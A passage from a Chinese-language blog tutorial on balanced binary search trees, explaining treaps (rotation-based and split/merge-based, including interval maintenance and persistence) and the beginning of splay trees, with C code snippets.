有了这样的一种数据结构，我们就可以在相当优秀的复杂度的前提下实现动态数组的查询操作，这里不再详细讲述了。但是，普通的BST有个十分致命的缺点，就是它在某些极端数据下，会导致BST退化成了一条链表，比如一个单调递增的数组[1,2,3,4,5,6,7,8]，每次插入一个点时，它都会位于上一个点的右儿子，这就导致了整个BST退化。<br><img src="/2019/05/28/data-structure3/binary_search_tree.png" alt="data-structure3"></p><p>　　为了解决BST的退化问题，我们需要对原始的BST进行改进，这就产生了平衡树。同样的，和它的名字一样，平衡树和原始的BST相比的特点就是“平衡”，即每个节点的左右儿子大小比较接近，一般就不会有像之前一样的退化成链表的情况了。</p><h2 id="treap"><a href="#treap" class="headerlink" title="treap"></a>treap</h2><p>　　Treap是一种实现起来十分方便的平衡树，效率也还不错。Treap是由两个单词组成的，第一个是tree，第二个是heap。tree表明treap是一种二叉搜索树，而heap表明treap同时也满足堆的性质。在这样的背景下，treap实现的<strong>期望时间复杂度为O(logn)</strong> 。具体treap是怎么实现的呢？答案就是rand()。和普通的BST相比，每个点维护两个值，一个是val，和BST一样，满足二叉搜索树的性质；另外一个是key，或者说是priority，并且满足堆的性质。</p><h3 id="rotate"><a href="#rotate" class="headerlink" title="rotate"></a>rotate</h3><p>　　实现treap的最重要的一个操作就是旋转。旋转是平衡树的一个十分重要的操作，通过旋转，平衡树能够在保证满足二叉搜索树的性质的同时，使得左右儿子趋于平衡。代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// T 表示每一个节点</span></span><br><span class="line"><span class="comment">// rotL表示左旋，rotR表示右旋</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">rotL</span><span class="params">(T &amp;t)</span> </span>&#123;</span><br><span class="line">    T t0 = t-&gt;left;</span><br><span class="line">    t-&gt;left = t0-&gt;right;</span><br><span class="line">    t0-&gt;right = t;</span><br><span class="line">    t-&gt;up();t0-&gt;up();</span><br><span class="line">    t = t0;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">rotR</span><span class="params">(T &amp;t)</span> </span>&#123;</span><br><span class="line">    T t0 = t-&gt;right;</span><br><span class="line">    t-&gt;right = t0-&gt;left;</span><br><span class="line">    t0-&gt;left = t;</span><br><span class="line">    t-&gt;up();t0-&gt;up();</span><br><span class="line">    t = t0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>　　该怎么理解好这段代码呢？以左旋为例，我们来看一下这张图，看下旋转操作究竟发生了什么。(建议自己尝试这画图理解一下)。这是初始状态，其中，我们将1号节点左旋：<br><img src="/2019/05/28/data-structure3/rotate1.png" alt="data-structure3"><br>　　第一步，我们拿到当前节点t的左儿子t0，然后将当前节点t的左儿子指向了t0的右儿子。<br><img src="/2019/05/28/data-structure3/rotate2.png" alt="data-structure3"><br>　　接着，由于t0的右儿子已经给了t，我们此时将t0的右儿子指向了t，这个时候，图像就变成了这样。<br><img src="/2019/05/28/data-structure3/rotate3.png" alt="data-structure3"><br>　　再把图片整理一下，我们发现，之前作为左儿子的t0变成了”根节点”，之前是”根节点”的t却变成了t0的右儿子。<br><img src="/2019/05/28/data-structure3/rotate4.png" alt="data-structure3"><br>　　好了，看完左旋操作，我们发现了什么呢？这个操作是不是很像<strong>以旋转的目标节点为中心的顺时针旋转操作</strong>呢？这就是为什么这个操作被称作左旋，注意到，左旋后，左儿子变成了根。同理，右旋操作会将右儿子变成根，同时，之前的根变成了之前的右儿子的左儿子。虽然有点绕，但还是要理解清楚的。<br>　　与此同时，我们发现了一个细节，旋转之前，根的左儿子的高度为2，右儿子的高度为1；旋转过后，根的左儿子的高度变成了1，右儿子的高度变成了2。结合上图，我们可以得知，<strong>左旋操作使得当前节点的左儿子高度-1，右儿子高度+1</strong>，右旋操作则反过来。因此，通过这样的旋转，我们能使整棵树趋向于平衡状态，这就是平衡树！<br>　　旋转操作仅有这些特点吗？显然不止。如果我们把节点的val和priority写上，我们还会发现一个特征。如下图(val简写为v，priority简写为p)：<br><img src="/2019/05/28/data-structure3/rotate5.png" alt="data-structure3"><br>　　我们先看val的值。仔细观察，我们发现，旋转前，这颗树满足二叉搜索树的性质，旋转后，这颗树依然满足二叉搜索树的性质。即，<strong>旋转不破坏BST性质</strong>。这是可以证明的，读者不妨自己试一试。<br>　　接着，我们再来看一下priority的值，我们发现，在一开始的时候，priority的值不满足堆的性质，但是在左旋过后，priority的值满足了大根堆性质。这告诉了我们，<strong>旋转可以用于维护大根堆的性质</strong>，当仅有左儿子的priority大于当前节点的时候，我们可以通过左旋操作，使整棵树重新满足了堆的性质。</p><h3 id="insert-amp-remove"><a href="#insert-amp-remove" class="headerlink" title="insert &amp; remove"></a>insert &amp; remove</h3><p>　　能理解好treap的旋转操作的话，插入和删除其实就简单很多了，这里以<a href="https://www.lydsy.com/JudgeOnline/problem.php?id=3224" target="_blank" rel="noopener">bzoj3224</a>为例，简单介绍一下插入和删除的一般写法。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> T Node*</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span></span><br><span class="line">    <span class="comment">// left right分别为指向左右儿子的指针</span></span><br><span class="line">    Node *left, *right;</span><br><span class="line">    <span class="comment">// v为权值，w用来表示出现的次数，即相同的v的个数，减少新建节点的操作</span></span><br><span class="line">    <span class="comment">// p表示priority，size维护树的大小</span></span><br><span class="line">    <span class="keyword">int</span> v, w, size, p;</span><br><span class="line">    Node(<span class="keyword">int</span> v, T k):v(v) &#123;</span><br><span class="line">        left = right = k;</span><br><span class="line">        p = rand();</span><br><span class="line">        w = size = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">up</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        size = left-&gt;size + right-&gt;size + w;</span><br><span class="line">    &#125; *rt, *empty;</span><br><span class="line">    <span class="comment">// rt表示root，即根节点，empty表示空节点，用来代替NULL，可以避免对空指针造成某些奇怪的意外</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insert</span><span class="params">(T &amp;t, <span class="keyword">int</span> v)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 指针为空时，新建节点并且返回，注意到参数为&amp;t</span></span><br><span class="line">    <span class="keyword">if</span> (t == empty) t = <span class="keyword">new</span> Node(v, empty);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// v相同时累加即可，值小于当前节点，往左儿子插入，大于时往右边插入。</span></span><br><span class="line">        <span class="comment">// 注意到插入过后有可能无法满足priority的大根堆性质，需要使用旋转操作来维护。</span></span><br><span class="line">        <span class="keyword">if</span> (v == t-&gt;v) t-&gt;w++;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (v &lt; t-&gt;v) &#123;</span><br><span class="line">            insert(t-&gt;left, v);</span><br><span class="line">            <span class="keyword">if</span> (t-&gt;left-&gt;p &gt; t-&gt;p) rotL(t);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            insert(t-&gt;right, v);</span><br><span class="line">            <span class="keyword">if</span> (t-&gt;right-&gt;p &gt; t-&gt;p) rotR(t);</span><br><span class="line">        &#125;</span><br><span class="line">        t-&gt;up();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">remove</span><span class="params">(T &amp;t, <span class="keyword">int</span> v)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 删除时同理，小于的话往左儿子删，大于的话往右儿子删</span></span><br><span class="line">    <span class="keyword">if</span> (v &lt; t-&gt;v) remove(t-&gt;left, v);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (v &gt; t-&gt;v) remove(t-&gt;right, v);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// w大于1时，-1即可。否则删除当前节点。</span></span><br><span class="line">        <span class="comment">// 注意到删除节点的时候，如果左右儿子其中一个为空的时候，直接用儿子代替自己即可。</span></span><br><span class="line">        <span class="comment">// 如果左右儿子均为空，直接删除即可。</span></span><br><span class="line">        <span class="comment">// 如果左右儿子都非空，那么就可以通过旋转操作将儿子移动到当前节点，并递归删除</span></span><br><span class="line">        <span class="comment">// 注意旋转时要保证大根堆的性质，另外，new的对象记得回收</span></span><br><span class="line">        <span class="keyword">if</span> (t-&gt;w &gt; <span class="number">1</span>) t-&gt;w--;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (t-&gt;left != empty &amp;&amp; t-&gt;right != empty) &#123;</span><br><span class="line">                <span class="keyword">if</span> (t-&gt;left-&gt;p &gt; t-&gt;right-&gt;p) &#123;</span><br><span class="line">                    rotL(t);</span><br><span class="line">                    remove(t-&gt;right, v);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    rotR(t);</span><br><span class="line">                    remove(t-&gt;left, v);</span><br><span class="line">                &#125;</span><br><span class="line">                t-&gt;up();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                T t0 = t;</span><br><span class="line">                <span class="keyword">if</span> (t-&gt;left == empty) t = t-&gt;right;</span><br><span class="line">                <span class="keyword">else</span> t = t-&gt;left;</span><br><span class="line">                <span class="keyword">delete</span> t0;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (t != empty) t-&gt;up();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>　　其实，插入和删除操作和普通的BST是很像的，区别仅在于treap需要维护大根堆的特性，因此需要有rotate这样的操作来保证。换句话说，<strong>treap相比BST仅仅多了priority属性</strong>。当然，如果你足够细心的话，会发现treap的平衡性的维护事实上并不是稳定的，因此，treap属于弱平衡树，在某些情况下它的效果不是很好。当然，treap的最大优势在于写法比较简单，并且在实践中的整体表现也较为良好。<del>因此是平衡树的不二选择</del></p><h2 id="no-rotation-treap"><a href="#no-rotation-treap" class="headerlink" title="no rotation treap"></a>no rotation treap</h2><p>　　前面我们讲的是普通的treap，它是采用旋转操作来维护priority的，但是，还有另一种类型的treap，它的实现完全不需要旋转，还能维护treap的性质，这就是无旋treap。并且重点是，<strong>无旋treap还能用于维护区间，并且支持可持久化</strong>。这是多么强大的能力！就让我们一起来学习一下吧。<br>　　既然无旋treap不是使用rotate来维护，那么它是怎么保证treap的平衡的呢？这就涉及它的两个核心函数了——split和merge。</p><h3 id="split"><a href="#split" class="headerlink" title="split"></a>split</h3><p>　　和字面意思一样，split函数用于把一棵树分裂成两个部分。其中，l,r充当返回值的作用(也可以用pair类，返回两个值)，即返回<strong>分裂成功的两颗树的根</strong>。t是当前待分裂的树，v是用于分裂条件的判断的，此处v表示的是节点的值(我们知道节点的值满足二叉搜索树的性质)，v也可以用来表示需要分裂出的子树的大小，这里以按值来分裂为例子。如果v小于等于当前的值，那么说明和v相等的值只会位于左子树当中，则分裂左子树，得到分裂成功的两个子树a和b后，当前节点的左儿子应该指向子树b，并作为右节点返回给上一层，这里需要理解清楚，v大于当前节点时，处理方法同理。递归的边界条件为当前节点是空的，直接返回两个空的子树即可。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 结构体的定义和之前一样。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> T Node*</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">split</span><span class="params">(T t, <span class="keyword">int</span> v, T &amp;l, T &amp;r)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (t == empty) &#123;</span><br><span class="line">        l = r = empty;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (v &lt;= t-&gt;v) &#123;</span><br><span class="line">        split(t-&gt;l, v, l, r);</span><br><span class="line">        t-&gt;l = r;</span><br><span class="line">        r = t;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        split(t-&gt;r, v, l, r);</span><br><span class="line">        t-&gt;r = l;</span><br><span class="line">        l = t;</span><br><span class="line">    &#125;</span><br><span class="line">    t-&gt;up();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>　　如果还是不太理解的话，可以参考一下下面的图。节点中的值表示val。现在执行以下的函数：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">T a;T b;</span><br><span class="line">split(rt, <span class="number">4</span>, a, b);</span><br></pre></td></tr></table></figure></p><p>　　这个函数的结果是把当前的树rt中按照是否小于4分成了两个子树，其中，子树a的所有值小于3，b中的所有值大于等于4，不妨自己手动画一下。<br><img src="/2019/05/28/data-structure3/split.png" alt="data-structure3"></p><h3 id="merge"><a href="#merge" class="headerlink" title="merge"></a>merge</h3><p>　　同样的，merge函数用于将两个子树合成为一个。注意到一个重要的事实，合并的两个子树<strong>a和b满足a中所有元素的值小于b中所有元素的值</strong>。我们考虑一下合并两个子树应有的操作。如果子树a的根节点的priority大于子树b的根节点，那么a应该作为合并后的树的根节点，这个时候，我们就将a的右儿子和b合并(因为b所有元素的值大于a，要满足BST的性质) 。否则，将a和b的左儿子合并。这里要注意参数传递的顺序，不能弄反了。递归的边界条件为子树a或b其中某一个为空，这个时候返回另一个非空的子树即可。（其实，你会发现，无旋treap只有在这个地方用到了priority，因此，即使把a-&gt;p &gt; b-&gt;p替换成rand()&amp;1也是可以的。这样，就相当于每次合并都是近似随机的了。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">T <span class="title">merge</span><span class="params">(T a, T b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (a == empty) <span class="keyword">return</span> b;</span><br><span class="line">    <span class="keyword">if</span> (b == empty) <span class="keyword">return</span> a;</span><br><span class="line">    <span class="keyword">if</span> (a-&gt;p &gt; b-&gt;p) &#123;</span><br><span class="line">        a-&gt;r = merge(a-&gt;r, b);</span><br><span class="line">        a-&gt;up();</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        b-&gt;l = merge(a, b-&gt;l);</span><br><span class="line">        b-&gt;up();</span><br><span class="line">        <span class="keyword">return</span> b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="insert-amp-remove-1"><a href="#insert-amp-remove-1" class="headerlink" title="insert &amp; remove"></a>insert &amp; remove</h3><p>　　现在考虑我们应该如何插入一个节点。如果我们理解了split和merge操作的话，插入一个节点是很简单的。考虑插入的节点的val为v，那么我们可以将当前的树用split划分成为小于v和大于v和等于v的三个部分a，b，并且把当前节点c看作一颗独立的树，依次将a,c,b合并成一颗树即可。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ins</span><span class="params">(<span class="keyword">int</span> v)</span> </span>&#123;</span><br><span class="line">    T a;T b;</span><br><span class="line">    T c;T d;</span><br><span class="line">    split(rt, v, a, b);</span><br><span class="line">    split(b, v+<span class="number">1</span>, c, d);</span><br><span class="line">    <span class="keyword">if</span> (c == empty) c = <span class="keyword">new</span> Node(v, empty);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        c-&gt;w++;</span><br><span class="line">        c-&gt;size++;</span><br><span class="line">    &#125;</span><br><span class="line">    rt = merge(a, merge(c, d));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>　　删除操作其实也是很类似的。我们同样将原来的树划分为三个部分。并且，得到的等于1的那个部分如果w大于1，直接减1就好。否则就直接将小于v的子树和大于v的子树合并。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rem</span><span class="params">(<span class="keyword">int</span> v)</span> </span>&#123;</span><br><span class="line">    T a;T b;</span><br><span class="line">    T c;T d;</span><br><span class="line">    split(rt, v, a, b);</span><br><span class="line">    split(b, v+<span class="number">1</span>, c, d);</span><br><span class="line">    <span class="keyword">if</span> (c-&gt;w &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        c-&gt;w--;c-&gt;size--;</span><br><span class="line">        d = merge(c, d);</span><br><span class="line">    &#125;</span><br><span class="line">    rt = merge(a, d);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>　　当然，读者如果细心的话，会发现这里其实<del>忘记回收节点了，这个就导致了内存泄漏了鸭(雾</del></p><h3 id="build-a-treap"><a href="#build-a-treap" class="headerlink" title="build a treap"></a>build a treap</h3><p>　　至于建立一颗treap的话，方法其实有挺多种，其中一种就是直接把每一个节点按顺序插入即可。另一种方法就是对插入的数组进行二分建树，复杂度也差不多。当然，如果是维护一个区间的话，我们可以采用笛卡尔树的建树方法，复杂度仅为O(n)。这里就不再赘述了。</p><h3 id="maintain-an-interval"><a href="#maintain-an-interval" class="headerlink" title="maintain an interval"></a>maintain an interval</h3><p>　　和普通的treap相比而言，无旋treap的一个重要用法是维护一个区间。如果现在给定一个数组a = [1,7,3,5,6,4,2]，现在以<strong>数组下标</strong>为val建树，则我们得到的树当中，对于任意一个节点，当前节点的左儿子在数组中下标一定在当前节点左侧，右儿子在数组中的下标一定在当前节点右侧，并且，每一个节点的构成的树包含的是一个连续的区间！这是一个及其重要的性质，利用这个性质，我们可以做到很多意想不到的事情，以<a href="https://www.lydsy.com/JudgeOnline/problem.php?id=1500" target="_blank" rel="noopener">noi2005维修数列</a>为例。无旋treap可以动态地维护一个区间，某种程度上有点像线段树！<br>　　题目的大题意思如下：</p><blockquote><p>维护一个数列，要求支持添加，删除，翻转，修改，求和，求最大子序列和这几种操作</p></blockquote><p>　　其中，添加和删除是很简单的，前面已经讲过，这里不再赘述。至于求和操作，我们可以在每一个节点当中存一个值用来维护子树的大小。翻转操作的话，我们可以为每个节点打上一个标记，然后仅反转左右儿子即可。最大子序列的维护方式其实和线段树的处理方法是很类似的。每个节点维护当前节点包含的区间内左端点开始的最大值，右端点开始的最大值，以及整个区间的最大子序列，这样就可以用<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sum = l-&gt;sum + r-&gt;sum + v;</span><br><span class="line">lsum = max(l-&gt;lsum, max(l-&gt;sum + v, l-&gt;sum + v + r-&gt;lsum));</span><br><span class="line">rsum = max(r-&gt;rsum, max(r-&gt;sum + v, r-&gt;sum + v + l-&gt;rsum));</span><br><span class="line">msum = max(max(l-&gt;msum, r-&gt;msum), max(l-&gt;rsum, <span class="number">0</span>) + v + max(r-&gt;lsum, <span class="number">0</span>));</span><br></pre></td></tr></table></figure></p><p>　　来维护最大子序列了，其中，msum是区间的最大子序列，lsum是从左端点开始的最大子序列，rsum是从右端点开始的最大子序列。限于篇幅，这里就不再详细展开了。但是强烈建议读者亲自去尝试实现这道题，基本上能解决这道题的话，可以说就算是基本掌握无旋treap了。</p><h3 id="persistability"><a href="#persistability" class="headerlink" title="persistability"></a>persistability</h3><p>　　这里再简单补充一下。我们前面说，treap可以实现可持久化，那么，应该怎么实现呢？我们考虑一下之前线段树我们是怎么实现可持久化的——动态加点。因此，treap也可以用类似的思想去实现。我们每一次新的操作的时候，对每一个点都拷贝一份新的，然后就可以”复用”之前建立的树的信息了。但是一定要记住，后面的操作不能修改前面建立的树，否则可持久化特性就会被破坏。这也是为什么旋转treap不适合用于可持久化——旋转操作破坏了父子关系顺序。<br>　　具体实现过程中，我们可以写一个copyNode的复制函数(如果使用结构体和指针写法的话，可以new一个节点然后直接赋值即可)：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">copyNode</span><span class="params">(<span class="keyword">int</span> rt)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> cur = ++tot;</span><br><span class="line">    ch[cur][<span class="number">0</span>] = ch[rt][<span class="number">0</span>];</span><br><span class="line">    ch[cur][<span class="number">1</span>] = ch[rt][<span class="number">1</span>];</span><br><span class="line">    sz[cur] = sz[rt];</span><br><span class="line">    ... <span class="comment">// 信息的复制</span></span><br><span class="line">    <span class="keyword">return</span> cur;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>　　然后<strong>每一次需要更改节点的信息的时候，复制一个新的节点，在新的节点上修改信息即可</strong>，比如pushdown操作，split操作和merge操作。参考题目:<a href="https://www.luogu.org/problemnew/show/P5055" target="_blank" rel="noopener">可持久化文艺平衡树</a>。</p><h3 id="summary-of-treap"><a href="#summary-of-treap" class="headerlink" title="summary of treap"></a>summary of treap</h3><p>　　这里来对treap进行一个简单的总结吧。两种treap其实算是各有优势吧。第一种treap利用旋转维护priority，由于rand的随机性，我们能够实现一个效率比较高的简易平衡树。第二种treap利用的是分裂和”随机”合并操作来实现平衡的。第一种做法的优点在于它的写起来确实比较简单，并且它的常数较小。而第二种方法的优点在于能够实现区间的维护操作，并且能可持久化，写起来也比较简单。对于treap来说，无论是插入或者删除，查询等操作，其复杂度都是O(logn)，基本上算是相当优秀了。但是，treap始终是”伪”平衡树，有时候会被某些极端数据卡。　　</p><h2 id="splay"><a href="#splay" class="headerlink" title="splay"></a>splay</h2><p>　　前面我们介绍了treap，它确实很好用。然而，还有另外一种常用的平衡树，叫splay，中文名称为伸展树，很好地说明了这种平衡树的特性。和treap不同，splay在实现平衡的时候并不是为每个节点赋优先级，而是使用了”伸展”操作。<br>　　并且，splay在实现的时候，需要多记录一项每一个节点的父亲，用于后面的操作。</p><h3 id="rotate-1"><a href="#rotate-1" class="headerlink" title="rotate"></a>rotate</h3><p>　　在splay中，同样有旋转操作，不过这里的旋转操作的定义和treap不太一样。我们先来看一下splay是怎么进行旋转操作的吧。以下为伪代码：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// up为每个节点的更新操作，类似treap，注意顺序。</span></span><br><span class="line"><span class="comment">// ch[x][0] 表示x的左儿子，ch[x][1]表示x的右儿子，fa[x]表示x的父亲</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rotL</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> y = fa[x], z = fa[y];</span><br><span class="line">  ch[y][<span class="number">0</span>] = ch[x][<span class="number">1</span>];</span><br><span class="line">  fa[ch[x][<span class="number">1</span>]] = y;</span><br><span class="line">  ch[x][<span class="number">1</span>] = y;</span><br><span class="line">  fa[y] = x;</span><br><span class="line">  fa[x] = z;</span><br><span class="line">  <span class="keyword">if</span> (z) ch[z][y == ch[z][<span class="number">1</span>]] = x;</span><br><span class="line">  up(y);up(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>　　如果仔细地画一下的话，我们会发现，splay的旋转操作事实上是每个点向上旋转的，传进去的参数是需要”向上走”的点，而treap有点像是向下旋转的，传进去的参数是需要”向下走”的点，这是两种平衡树的一个重要区别。<br><img src="/2019/05/28/data-structure3/splay_rot.png" alt="data-structure3"><br>　　并且，我们还发现，使用0表示左儿子，1表示右儿子的写法，可以同时将左旋和右旋合并在一起，如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">get</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> x == ch[fa[x]][<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rotate</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> y = fa[x], z = fa[y], k = get(x);</span><br><span class="line">    ch[y][k] = ch[x][k^<span class="number">1</span>];</span><br><span class="line">    fa[ch[x][k^<span class="number">1</span>]] = y;</span><br><span class="line">    ch[x][k^<span class="number">1</span>] = y;</span><br><span class="line">    fa[y] = x;</span><br><span class="line">    fa[x] = z;</span><br><span class="line">    <span class="keyword">if</span> (z) ch[z][y == ch[z][<span class="number">1</span>]] = x;</span><br><span class="line">    up(y);up(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="splay-operation"><a href="#splay-operation" class="headerlink" title="splay operation"></a>splay operation</h3><p>　　splay操作是伸展树的核心部分，也是比较难的部分。splay本身的目的就是把某一个节点旋转到根节点。在伸展时，需要分情况考虑:<br>　　首先，第一种类型是当前节点的父亲就是根节点，那么只需要直接旋转到根节点即可。<br>　　第二种类型是当前节点是父亲的左(右)儿子，并且父亲是爷爷的左(右)儿子，那么这个时候需要先让父亲进行旋转，之后再旋转当前节点。<br>　　第三种类型是当前节点是父亲的左(右)儿子，并且父亲是爷爷的右(左)儿子，那么这个时候当前节点需要旋转两次。<br>　　无论是那一种情况，最后的递归边界为当前节点到达了根节点(父亲为空)。如果还是不太理解的话，建议画一下。<br><img src="/2019/05/28/data-structure3/splay.png" alt="data-structure3"><br>　　因此，我们可以得到以下的代码：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">splay</span><span class="params">(<span class="keyword">int</span> x)</span> 